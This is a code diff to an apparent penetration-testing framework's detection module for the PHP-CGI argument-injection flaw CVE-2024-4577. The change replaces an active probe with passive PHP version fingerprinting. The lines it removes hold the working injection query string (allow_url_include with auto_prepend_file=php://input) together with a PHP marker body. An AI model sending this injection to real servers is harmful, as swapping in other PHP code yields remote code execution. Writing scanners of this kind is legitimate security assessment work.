@@ -1,16 +1,21 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+import re
+from typing import Optional, Tuple
+
 from kittysploit import *
 from lib.protocols.http.http_client import Http_client
+from lib.scanner.http.detectors import detect_php
 
 
 class Module(Scanner, Http_client):
     __info__ = {
         "name": "PHP CGI Argument Injection (CVE-2024-4577) detection",
         "description": (
-            "Detects CVE-2024-4577 by probing PHP-CGI argument injection with a harmless PHP marker "
-            "via auto_prepend_file=php://input."
+            "Fingerprints PHP-CGI stacks and flags PHP versions in the CVE-2024-4577 affected "
+            "ranges on Windows (8.1 < 8.1.29, 8.2 < 8.2.20, 8.3 < 8.3.8). Confirm exploitation "
+            "with exploits/linux/http/php_cgi_cve_2024_4577_rce."
         ),
         "author": ["Orange Tsai", "watchTowr", "KittySploit Team"],
         "severity": "critical",
@@ -23,67 +28,83 @@ class Module(Scanner, Http_client):
             "exploits/linux/http/php_cgi_cve_2024_4577_rce",
         ],
         "tags": ["web", "scanner", "php", "cgi", "argument-injection", "rce"],
-    'agent': {
-        'risk': 'active',
-        'effects': ['network_probe'],
-        'expected_requests': 2,
-        'reversible': True,
-        'approval_required': False,
-        'produces': ['tech_hints', 'risk_signals', 'endpoints'],
-    },
+        "agent": {
+            "risk": "active",
+            "effects": ["network_probe"],
+            "expected_requests": 1,
+            "reversible": True,
+            "approval_required": False,
+            "produces": ["tech_hints", "risk_signals", "endpoints"],
+            "cost": 1.0,
+            "noise": 0.2,
+            "value": 1.0,
+        },
     }
 
-    target_path = OptString("/index.php", "Path to PHP-CGI entrypoint", required=False)
-    verify_marker = OptString("1337", "Marker used for safe probe", required=False, advanced=True)
-    active_probe = OptBool(True, "Send active marker probe (recommended)", required=False)
+    target_path = OptString("/index.php", "Path to PHP entrypoint", required=False)
 
-    CGI_ARG_INJECTION = "?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
+    @staticmethod
+    def _version_tuple(version: str) -> Tuple[int, ...]:
+        parts = []
+        for token in re.findall(r"\d+", version or ""):
+            parts.append(int(token))
+        while len(parts) < 3:
+            parts.append(0)
+        return tuple(parts[:3])
 
-    def _build_path(self) -> str:
-        p = str(self.target_path or "/index.php").strip()
-        if not p.startswith("/"):
-            p = "/" + p
-        return p
-
-    def _probe(self, marker: str):
-        body = f"<?php echo {marker!r}; die; ?>"
-        return self.http_request(
-            method="POST",
-            path=f"{self._build_path()}{self.CGI_ARG_INJECTION}",
-            data=body,
-            headers={"Content-Type": "application/x-www-form-urlencoded"},
-            timeout=max(int(self.timeout or 10), 10),
-            allow_redirects=False,
-        )
+    def _is_vulnerable_php(self, version: str) -> Optional[bool]:
+        major, minor, patch = self._version_tuple(version)
+        if major == 8 and minor == 1:
+            return patch < 29
+        if major == 8 and minor == 2:
+            return patch < 20
+        if major == 8 and minor == 3:
+            return patch < 8
+        return False
 
     def run(self):
         try:
-            if not self.active_probe:
-                root = self.http_request(method="GET", path="/", timeout=10, allow_redirects=True)
-                if root and "php" in (
-                    (root.headers.get("X-Powered-By", "") + root.headers.get("Server", "")).lower()
-                ):
-                    self.set_info(
-                        severity="medium",
-                        cve="CVE-2024-4577",
-                        reason="PHP detected, but active CVE-2024-4577 probe disabled",
-                    )
-                    return True
-                return False
-
-            marker = str(self.verify_marker or "1337")
-            response = self._probe(marker)
+            path = str(self.target_path or "/index.php").strip()
+            if not path.startswith("/"):
+                path = "/" + path
+            response = self.http_request(method="GET", path=path, allow_redirects=True, timeout=10)
             if not response:
                 return False
 
-            if response.status_code in (200, 500) and marker in (response.text or ""):
+            version = detect_php(response) or ""
+            if not version:
+                headers = " ".join(f"{k}:{v}" for k, v in response.headers.items()).lower()
+                if "php" not in headers and "cgi" not in headers:
+                    return False
                 self.set_info(
-                    severity="critical",
+                    severity="info",
                     cve="CVE-2024-4577",
-                    reason=f"Marker {marker!r} executed via PHP-CGI argument injection",
+                    reason="PHP/CGI hints detected but version could not be extracted",
+                    path=path,
                 )
                 return True
 
+            vulnerable = self._is_vulnerable_php(version)
+            if vulnerable:
+                self.set_info(
+                    severity="critical",
+                    cve="CVE-2024-4577",
+                    reason=(
+                        f"PHP {version} at {path} is within CVE-2024-4577 affected ranges "
+                        "(Windows CGI argument injection)"
+                    ),
+                    version=version,
+                    path=path,
+                    confidence="high",
+                )
+                return True
+
+            self.set_info(
+                severity="info",
+                reason=f"PHP {version} at {path} appears patched for CVE-2024-4577",
+                version=version,
+                path=path,
+            )
             return False
         except Exception:
             return False
